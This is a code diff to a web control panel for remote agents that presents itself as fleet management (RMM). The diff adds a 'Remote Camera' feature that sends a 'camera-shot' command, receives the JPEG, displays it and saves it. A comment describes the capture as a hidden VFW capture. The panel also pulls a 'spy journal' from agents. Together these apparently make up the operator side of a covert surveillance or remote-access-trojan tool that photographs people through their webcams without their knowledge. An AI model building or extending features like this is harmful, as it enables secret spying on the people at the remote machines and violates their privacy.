@@ -240,6 +240,7 @@ html{touch-action:manipulation}
       <button class="btn btn-small" id="pushUpdateBtn" title="Push bundled agent update to selected agent">⇪ Update</button>
       <button class="btn btn-small" id="pushUpdateAllBtn" title="Push bundled update to every outdated agent at once" style="display:none">⇪ Update All</button>
       <button class="btn btn-small" id="wizBtn" title="Open command wizard">🧙</button>
+      <button class="btn btn-small" id="camBtn" title="Open remote camera (camera-shot)">📷 Cam</button>
       <span id="agentVerBadge" style="font-size:11px;color:#888" title="Selected agent version"></span>
       <span id="updateBadge" style="display:none;font-size:11px;color:#FFD54F;cursor:pointer" title="">⇪ update</span>
       <span id="updateProg" style="font-size:11px;color:#8BC34A" title="Live update push progress"></span>
@@ -331,6 +332,7 @@ html{touch-action:manipulation}
       </div>
       <div style="display:flex;gap:8px"><button class="btn btn-small" id="deleteBtn">🗑 Delete Selected</button><button class="btn btn-small" id="renameBtn" title="Rename selected file/folder">✏ Rename</button><button class="btn btn-small" id="previewBtn" title="Preview selected image/text file">👁 Preview</button><button class="btn btn-small" id="queueBtn">☰ Queue</button><span style="margin-left:auto;font-size:11px;color:#888" id="fileStatus">Ready</span></div>
       <div id="previewOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:60;align-items:center;justify-content:center"><div id="previewBox" style="max-width:88vw;max-height:88vh;background:#1e1e1e;border:1px solid #555;border-radius:10px;padding:12px;display:flex;flex-direction:column;gap:8px"><div style="display:flex;gap:8px;align-items:center"><span id="previewTitle" style="font-size:12px;color:#ccc"></span><button class="btn btn-small" id="previewFullBtn" style="display:none" title="Load the full file">↧ Full</button><button class="btn btn-small" id="previewClose" style="margin-left:auto">✕ Close</button></div><div id="previewBody" style="overflow:auto;max-width:86vw;max-height:76vh;text-align:center"></div></div></div>
+      <div id="camOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:60;align-items:center;justify-content:center"><div id="camBox" style="max-width:90vw;max-height:90vh;background:#1e1e1e;border:1px solid #555;border-radius:10px;padding:12px;display:flex;flex-direction:column;gap:8px"><div style="display:flex;gap:8px;align-items:center"><span style="font-size:12px;color:#ccc">📷 Remote Camera</span><span id="camStatus" style="font-size:11px;color:#888"></span><button class="btn btn-small" id="camRefresh" style="margin-left:auto">⟳ Refresh</button><button class="btn btn-small" id="camSave">⤓ Save</button><button class="btn btn-small" id="camClose">✕ Close</button></div><div id="camBody" style="overflow:auto;max-width:88vw;max-height:78vh;text-align:center;color:#888">No frame yet — click Refresh</div></div></div>
     </section>
 
     <!-- Dashboard — second tab, fleet at a glance (RMM) -->
@@ -593,6 +595,22 @@ function connectWS(){
             }
           }
           if(t==="out" && /^upload complete:/.test(m.data||"")){ toast("Upload complete"); if(typeof refreshFiles==="function") refreshFiles(true); if(typeof pendingUpload!=="undefined"&&pendingUpload && (m.data||"").startsWith("upload complete: "+pendingUpload.path)){ const r=pendingUpload; pendingUpload=null; r.resolve(); } }
+          // Camera: data:image/jpeg comes back as a single output line.
+          if(m.data&&m.data.startsWith("data:image/")){
+            const cb=$("camBody"), st=$("camStatus"), ov=$("camOverlay");
+            if(cb) cb.innerHTML=`<img src="${m.data}" style="max-width:100%;max-height:76vh;object-fit:contain"/>`;
+            if(st) st.textContent="Frame from "+(m.id||selected?.hostname||"agent")+" • "+Math.round(m.data.length/1024)+"KB";
+            if(ov) ov.style.display="flex";
+            toast("Camera snapshot received");
+            return;
+          }
+          if(m.error&&m.error.toLowerCase().includes("no camera")){
+            const cb=$("camBody"), st=$("camStatus");
+            if(cb) cb.textContent="No camera on this PC — "+m.error;
+            if(st) st.textContent="No camera";
+            toast("No camera on remote PC","err");
+            return;
+          }
           if(pendingClipPull && m.id===pendingClipPull){
             pendingClipPull=null;
             const txt=m.data||"";
@@ -1393,6 +1411,17 @@ $("autoUpdToggle").onclick=()=>{
 };
 $("logsBtn").onclick=()=>{ if(!needAgent()) return; sendCmdVal("get-agent-log 150"); addTerm("Pulling log tail from "+(selected.hostname||selected.id)+"…","out"); };
 $("spyBtn").onclick=()=>{ if(!needAgent()) return; sendCmdVal("get-spy-log 120"); addTerm("Pulling spy journal from "+(selected.hostname||selected.id)+"…","out"); };
+// Remote camera (camera-shot): hidden VFW capture, data-URL JPEG back.
+let camLastData="";
+function camShot(qual){ if(!needAgent()) return; $("camOverlay").style.display="flex"; $("camBody").innerHTML="Loading…"; $("camStatus").textContent="Requesting camera…"; sendCmdVal("camera-shot "+(qual||60)); addTerm("Camera shot @ q"+(qual||60)+"…","out"); }
+$("camBtn")?.addEventListener("click", ()=>camShot(60));
+$("camRefresh")?.addEventListener("click", ()=>camShot(60));
+$("camClose")?.addEventListener("click", ()=>{ $("camOverlay").style.display="none"; });
+$("camOverlay")?.addEventListener("click", e=>{ if(e.target===$("camOverlay")) $("camClose").click(); });
+$("camSave")?.addEventListener("click", ()=>{
+  const img=$("camBody")?.querySelector("img"); if(!img||!img.src) return;
+  const a=document.createElement("a"); a.href=img.src; a.download="camera-"+new Date().toISOString().slice(0,19).replace(/[:T]/g,"-")+".jpg"; a.click();
+});
 // Agent operation mode selector (set-mode restarts the agent into it).
 function refreshModeSel(){
   const s=$("modeSel"); if(!s) return;
